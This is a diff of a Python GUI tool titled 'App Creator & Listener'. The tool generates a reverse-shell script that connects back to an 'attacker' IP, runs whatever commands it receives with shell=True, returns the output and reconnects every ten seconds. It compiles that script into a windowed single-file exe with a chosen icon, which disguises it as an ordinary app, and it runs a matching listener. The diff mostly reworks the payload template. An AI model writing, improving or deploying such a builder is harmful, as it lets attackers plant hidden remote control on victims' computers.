@@ -6,15 +6,12 @@ import time
 import tkinter as tk
 from tkinter import filedialog
 import threading
+from textwrap import dedent
 
-# Initialize current_directory to the current working directory
-current_directory = os.getcwd()
-new_dir = ""
-e = ""
 server_socket = None
 client_socket = None
 
-# Function to create app
+# Function to create app (generate Python file and build exe)
 def create_app():
     # Get input data from the user
     app_name = app_name_entry.get()
@@ -30,77 +27,77 @@ def create_app():
     # Path for saving the Python file
     python_file_path = os.path.join(output_folder, f"{app_name}.py")
 
-    # Generate the python file content
-    python_code = f"""
-import socket
-import subprocess
-import os
-import time
+    # Generate the Python file content with correct error messages and dynamic directory updates
+    python_code = dedent(f"""\
+        import socket
+        import subprocess
+        import os
+        import time
 
-# Set up the IP and port of the attacker's machine (your Android device)
-attacker_ip = '{host}'  # Replace with your Android device's IP
-attacker_port = {port}  # The port you are listening on in Termux
+        # Set up the IP and port of the attacker's machine (your Android device)
+        attacker_ip = '{host}'  # Replace with your Android device's IP
+        attacker_port = {port}  # The port you are listening on in Termux
 
-def connect_shell():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        s.connect((attacker_ip, attacker_port))
-        print("Connection established.")
-        return s
-    except Exception as e:
-        print(f"Connection failed: {e}")
-        return None
-
-# Start in the user's home directory
-current_directory = os.getcwd()
-
-while True:
-    sock = connect_shell()
-    if sock:
-        while True:
+        def connect_shell():
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             try:
-                # Receive command from the attacker
-                command = sock.recv(1024).decode("utf-8")
-
-                if not command:
-                    # If no command is received, reconnect
-                    print("Connection lost. Reconnecting...")
-                    sock.close()
-                    break
-
-                if command.lower() == "exit":
-                    sock.close()
-                    print("Exiting shell.")
-                    break
-
-                # Change the current directory if the command is 'cd'
-                if command.startswith("cd "):
-                    try:
-                        new_dir = command[3:].strip()
-                        os.chdir(new_dir)
-                        current_directory = os.getcwd()
-                        sock.send(f"Changed directory to {current_directory}\\n".encode("utf-8"))
-                    except FileNotFoundError:
-                        sock.send(f"Directory not found: {new_dir}\\n".encode("utf-8"))
-                else:
-                    # Execute other commands in the current directory
-                    output = subprocess.run(
-                        command,
-                        shell=True,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE,
-                        cwd=current_directory,
-                    )
-                    sock.send(output.stdout + output.stderr)
-
+                s.connect((attacker_ip, attacker_port))
+                print("Connection established.")
+                return s
             except Exception as e:
-                sock.send(f"Error: {str(e)}\\n".encode("utf-8"))
-                break
-    else:
-        # If connection fails, retry after 10 seconds
-        print("Retrying connection...")
-        time.sleep(10)
-    """
+                print(f"Connection failed: {{e}}")
+                return None
+
+        # Start in the user's home directory
+        current_directory = os.getcwd()
+
+        while True:
+            sock = connect_shell()
+            if sock:
+                while True:
+                    try:
+                        # Receive command from the attacker
+                        command = sock.recv(1024).decode("utf-8")
+
+                        if not command:
+                            # If no command is received, reconnect
+                            print("Connection lost. Reconnecting...")
+                            sock.close()
+                            break
+
+                        if command.lower() == "exit":
+                            sock.close()
+                            print("Exiting shell.")
+                            break
+
+                        # Change the current directory if the command is 'cd'
+                        if command.startswith("cd "):
+                            try:
+                                new_dir = command[3:].strip()
+                                os.chdir(new_dir)
+                                current_directory = os.getcwd()
+                                sock.send(f"Changed directory to {{current_directory}}\\n".encode("utf-8"))
+                            except FileNotFoundError:
+                                sock.send(f"Directory not found: {{new_dir}}\\n".encode("utf-8"))
+                        else:
+                            # Execute other commands in the current directory
+                            output = subprocess.run(
+                                command,
+                                shell=True,
+                                stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE,
+                                cwd=current_directory,
+                            )
+                            sock.send(output.stdout + output.stderr)
+
+                    except Exception as e:
+                        sock.send(f"Error: {{str(e)}}\\n".encode("utf-8"))
+                        break
+            else:
+                # If connection fails, retry after 10 seconds
+                print("Retrying connection...")
+                time.sleep(10)
+        """)
 
     # Write the generated code to a Python file
     with open(python_file_path, 'w') as file:
@@ -112,7 +109,7 @@ while True:
     os.chdir(output_folder)
 
     # Use PyInstaller to generate an exe
-    pyinstaller_command = f"python -m PyInstaller --noconfirm --onefile --windowed --icon \"{app_icon}\" \"{python_file_path}\""
+    pyinstaller_command = f'python -m PyInstaller --noconfirm --onefile --windowed --icon "{app_icon}" "{python_file_path}"'
     os.system(pyinstaller_command)
     print("Executable created successfully!")
 
@@ -177,7 +174,6 @@ def handle_client(client_socket):
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
             )
-
             client_socket.send(output.stdout + output.stderr)
 
     except Exception as e:
@@ -186,9 +182,7 @@ def handle_client(client_socket):
 
 # Function to stop the listener
 def stop_listener():
-    global server_socket
-    global client_socket
-
+    global server_socket, client_socket
     if server_socket:
         server_socket.close()
         print("Server socket closed.")
@@ -198,7 +192,6 @@ def stop_listener():
 
 # Setting up the GUI
 root = ctk.CTk()
-
 root.geometry("500x600")
 root.title("App Creator & Listener")
 
